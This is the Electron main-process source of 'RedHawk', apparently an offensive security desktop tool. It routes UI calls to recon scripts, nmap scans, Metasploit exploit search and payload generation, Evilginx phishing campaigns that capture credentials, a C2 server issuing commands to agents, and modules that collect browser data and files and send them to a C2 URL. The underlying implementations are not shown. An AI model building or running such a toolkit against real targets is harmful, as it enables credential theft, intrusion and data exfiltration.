import { app, BrowserWindow, ipcMain, dialog } from 'electron';
import * as path from 'path';
import * as fs from 'fs';
import { ToolRunner } from './services/tool-runner';
import { NmapParser } from './services/nmap-parser';
import { PythonRunner } from './services/python-runner';
import { DependencyChecker } from './services/dependency';
import { TargetStore } from './services/target-store';
import { MsfRpcClient } from './services/msf-rpc-client';
import { EvilginxManager } from './services/evilginx-manager';
import { C2Server } from './services/c2-server';
import { ExfilManager } from './services/exfil-manager';
import { paths, isDev } from './services/paths';

let mainWindow: BrowserWindow | null = null;
let toolRunner: ToolRunner;
let nmapParser: NmapParser;
let pythonRunner: PythonRunner;
let depChecker: DependencyChecker;
let targetStore: TargetStore;
let msfClient: MsfRpcClient;
let evilginxManager: EvilginxManager;
let c2Server: C2Server;
let exfilManager: ExfilManager;

function createWindow() {
  try {
    mainWindow = new BrowserWindow({
      width: 1280,
      height: 860,
      minWidth: 960,
      minHeight: 640,
      title: 'RedHawk',
      backgroundColor: '#070b17',
      icon: path.join(paths.resources, 'icon.png'),
      webPreferences: {
        preload: path.join(paths.distElectron, 'preload.js'),
        contextIsolation: true,
        nodeIntegration: false,
        sandbox: false,
      },
    });
  } catch (err: any) {
    console.error('Window creation error:', err.message, err.stack);
    return;
  }

  // Load from Vite dev server only if running with --dev flag or DEV=1
  const useDevServer = process.argv.includes('--dev') || process.env.DEV === '1';
  if (useDevServer) {
    mainWindow.loadURL('http://localhost:5173');
    mainWindow.webContents.openDevTools();
  } else {
    mainWindow.loadFile(path.join(paths.dist, 'index.html'));
  }

  mainWindow.on('closed', () => {
    mainWindow = null;
  });
}

function registerIpcHandlers() {
  // ── Target Management ──
  ipcMain.handle('set-target', async (_event, target: string) => {
    return targetStore.setTarget(target);
  });

  ipcMain.handle('get-target', async () => {
    return targetStore.getTarget();
  });

  // ── Dependency Check ──
  ipcMain.handle('check-deps', async () => {
    return depChecker.checkAll();
  });

  ipcMain.handle('install-deps', async (_event, confirm: boolean) => {
    if (!confirm) return { success: false, message: 'User cancelled' };
    return depChecker.installAll();
  });

  // ── Recon Tools ──
  ipcMain.handle('run-whois', async (_event, domain: string) => {
    return pythonRunner.runScript('whois_lookup.py', [domain]);
  });

  ipcMain.handle('run-dns-enum', async (_event, domain: string) => {
    return pythonRunner.runScript('dns_enum.py', [domain]);
  });

  ipcMain.handle('run-subdomain-enum', async (_event, domain: string) => {
    return pythonRunner.runScript('subdomain_enum.py', [domain]);
  });

  ipcMain.handle('run-email-osint', async (_event, domain: string) => {
    return pythonRunner.runScript('email_osint.py', [domain]);
  });

  ipcMain.handle('run-nmap-scan', async (_event, ip: string, flags: string) => {
    const rawXml = await toolRunner.runNmap(ip, flags);
    return nmapParser.parse(rawXml);
  });

  // ── Quick Scan ──
  ipcMain.handle('run-quick-scan', async (_event, target: string) => {
    const isDomain = target.includes('.') && !target.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/);
    const results: any = { target, timestamp: new Date().toISOString() };

    const sendStatus = (msg: string) => {
      mainWindow?.webContents.send('scan-status', { target, message: msg });
    };

    try {
      if (isDomain) {
        sendStatus('Running WHOIS lookup...');
        results.whois = await pythonRunner.runScript('whois_lookup.py', [target]);

        sendStatus('Enumerating DNS records...');
        results.dns = await pythonRunner.runScript('dns_enum.py', [target]);

        sendStatus('Finding subdomains...');
        results.subdomains = await pythonRunner.runScript('subdomain_enum.py', [target]);

        sendStatus('Looking up emails...');
        results.emails = await pythonRunner.runScript('email_osint.py', [target]);
      }

      sendStatus('Running port scan (top 1000 ports)...');
      const nmapResult = await toolRunner.runNmap(
        isDomain ? target : target,
        '-sS -T4 --top-ports 1000'
      );
      results.nmap = await nmapParser.parse(nmapResult);

    } catch (err: any) {
      results.error = err.message;
    }

    targetStore.addScanResult(target, results);
    mainWindow?.webContents.send('scan-complete', results);
    return results;
  });

  // ── Results ──
  ipcMain.handle('get-scan-results', async (_event, target: string) => {
    return targetStore.getScanResults(target);
  });

  ipcMain.handle('get-scan-history', async () => {
    return targetStore.getHistory();
  });

  // ── Metasploit RPC ──
  ipcMain.handle('msf-connect', async (_event, host: string, port: number, password: string) => {
    try {
      msfClient = new MsfRpcClient(host, port, password);
      await msfClient.connect();
      const version = await msfClient.getVersion();
      return { connected: true, version };
    } catch (err: any) {
      return { connected: false, error: err.message };
    }
  });

  ipcMain.handle('msf-disconnect', async () => {
    if (msfClient) msfClient.disconnect();
    return { success: true };
  });

  ipcMain.handle('msf-search', async (_event, query: string) => {
    if (!msfClient?.isConnected()) throw new Error('Not connected to Metasploit');
    return msfClient.searchExploits(query);
  });

  ipcMain.handle('msf-generate-payload', async (_event, payload: string, lhost: string, lport: number) => {
    if (!msfClient?.isConnected()) throw new Error('Not connected to Metasploit');
    return msfClient.generatePayload(payload, lhost, lport);
  });

  ipcMain.handle('msf-list-sessions', async () => {
    if (!msfClient?.isConnected()) throw new Error('Not connected to Metasploit');
    return msfClient.listSessions();
  });

  // ── Phishing / Evilginx ──
  ipcMain.handle('phish-check', async () => {
    return evilginxManager.checkAvailability();
  });

  ipcMain.handle('phish-get-phishlets', async () => {
    return evilginxManager.getPhishlets();
  });

  ipcMain.handle('phish-create-campaign', async (_event, name: string, targetDomain: string, phishlet: string) => {
    return evilginxManager.createCampaign(name, targetDomain, phishlet);
  });

  ipcMain.handle('phish-get-campaigns', async () => {
    return evilginxManager.getCampaigns();
  });

  ipcMain.handle('phish-start-campaign', async (_event, campaignId: string, domain: string, ip: string) => {
    return evilginxManager.startCampaign(campaignId, domain, ip);
  });

  ipcMain.handle('phish-stop-campaign', async (_event, campaignId: string) => {
    return evilginxManager.stopCampaign(campaignId);
  });

  ipcMain.handle('phish-get-credentials', async (_event, campaignId: string) => {
    return evilginxManager.getCapturedCredentials(campaignId);
  });

  ipcMain.handle('phish-delete-campaign', async (_event, campaignId: string) => {
    return evilginxManager.deleteCampaign(campaignId);
  });

  // ── C2 Server ──
  ipcMain.handle('c2-start', async (_event, config: any) => {
    if (c2Server && c2Server.isRunning()) {
      return { running: true };
    }
    c2Server = new C2Server(config);
    const ok = await c2Server.start();

    c2Server.on('started', (info) => {
      mainWindow?.webContents.send('c2-event', { type: 'started', data: info });
    });
    c2Server.on('newAgent', (agent) => {
      mainWindow?.webContents.send('c2-event', { type: 'newAgent', data: agent });
    });
    c2Server.on('taskResult', (task) => {
      mainWindow?.webContents.send('c2-event', { type: 'taskResult', data: task });
    });
    c2Server.on('error', (msg) => {
      mainWindow?.webContents.send('c2-event', { type: 'error', data: msg });
    });

    return { running: ok, config: c2Server.getConfig() };
  });

  ipcMain.handle('c2-stop', async () => {
    if (c2Server) c2Server.stop();
    return { success: true };
  });

  ipcMain.handle('c2-status', async () => {
    if (!c2Server || !c2Server.isRunning()) {
      return { running: false, agents: 0, tasks: 0 };
    }
    return {
      running: true,
      agents: c2Server.getAgents().length,
      tasks: c2Server.getTasks().length,
      config: c2Server.getConfig(),
    };
  });

  ipcMain.handle('c2-agents', async () => {
    return c2Server?.getAgents() || [];
  });

  ipcMain.handle('c2-tasks', async (_event, agentId: string) => {
    return c2Server?.getTasks(agentId) || [];
  });

  ipcMain.handle('c2-send-command', async (_event, agentId: string, command: string) => {
    return c2Server?.queueCommand(agentId, command) || null;
  });

  ipcMain.handle('c2-broadcast', async (_event, command: string) => {
    return c2Server?.broadcastCommand(command) || [];
  });

  ipcMain.handle('c2-generate-payload', async (_event, type: string) => {
    if (!c2Server) return '';
    return c2Server.generateAgentPayload(type as 'python' | 'powershell');
  });

  // ── Exfiltration ──
  ipcMain.handle('exfil-jobs', async () => {
    return exfilManager.getJobs();
  });

  ipcMain.handle('exfil-create-job', async (_event, name: string, targetDir: string) => {
    return exfilManager.createFileCollectionJob(name, targetDir, ['*']);
  });

  ipcMain.handle('exfil-collect-files', async (_event, jobId: string) => {
    return exfilManager.collectFiles(jobId);
  });

  ipcMain.handle('exfil-screenshot', async () => {
    return exfilManager.takeScreenshot();
  });

  ipcMain.handle('exfil-browser-data', async () => {
    return exfilManager.collectBrowserData();
  });

  ipcMain.handle('exfil-package', async (_event, jobId: string) => {
    return exfilManager.packageData(jobId);
  });

  ipcMain.handle('exfil-send-to-c2', async (_event, packagePath: string, c2Url: string) => {
    return exfilManager.exfiltrateToC2(packagePath, c2Url);
  });

  ipcMain.handle('exfil-total-size', async () => {
    return exfilManager.getTotalSize();
  });

  ipcMain.handle('exfil-key', async () => {
    return exfilManager.getEncryptionKey();
  });

  ipcMain.handle('exfil-clear', async () => {
    exfilManager.clearAll();
  });

  // ── Save Report ──
  ipcMain.handle('save-report', async (_event, reportHtml: string) => {
    if (!mainWindow) return { success: false, error: 'No window' };

    const result = await dialog.showSaveDialog(mainWindow, {
      title: 'Save Report',
      defaultPath: `RedHawk_Report_${new Date().toISOString().split('T')[0]}.html`,
      filters: [
        { name: 'HTML Report', extensions: ['html'] },
        { name: 'All Files', extensions: ['*'] },
      ],
    });

    if (result.canceled || !result.filePath) {
      return { success: false, error: 'Cancelled' };
    }

    try {
      fs.writeFileSync(result.filePath, reportHtml, 'utf-8');
      return { success: true, filePath: result.filePath };
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  });

  // ── Live output ──
  toolRunner.onOutput((data: string) => {
    mainWindow?.webContents.send('scan-output', data);
  });
}

// Global error handlers
process.on('uncaughtException', (err) => {
  console.error('UNCAUGHT:', err.message, err.stack);
});
process.on('unhandledRejection', (reason) => {
  console.error('UNHANDLED:', reason);
});

app.whenReady().then(() => {
  try {
    const userDataPath = app.getPath('userData');

    toolRunner = new ToolRunner();
    nmapParser = new NmapParser();
    pythonRunner = new PythonRunner(userDataPath, app.isPackaged);
    depChecker = new DependencyChecker(userDataPath);
    targetStore = new TargetStore(userDataPath);
    msfClient = new MsfRpcClient();
    evilginxManager = new EvilginxManager(userDataPath);
    c2Server = new C2Server();
    exfilManager = new ExfilManager(userDataPath);

    registerIpcHandlers();
    createWindow();
  } catch (err: any) {
    console.error('Init error:', err.message, err.stack);
  }

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow();
  });
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});
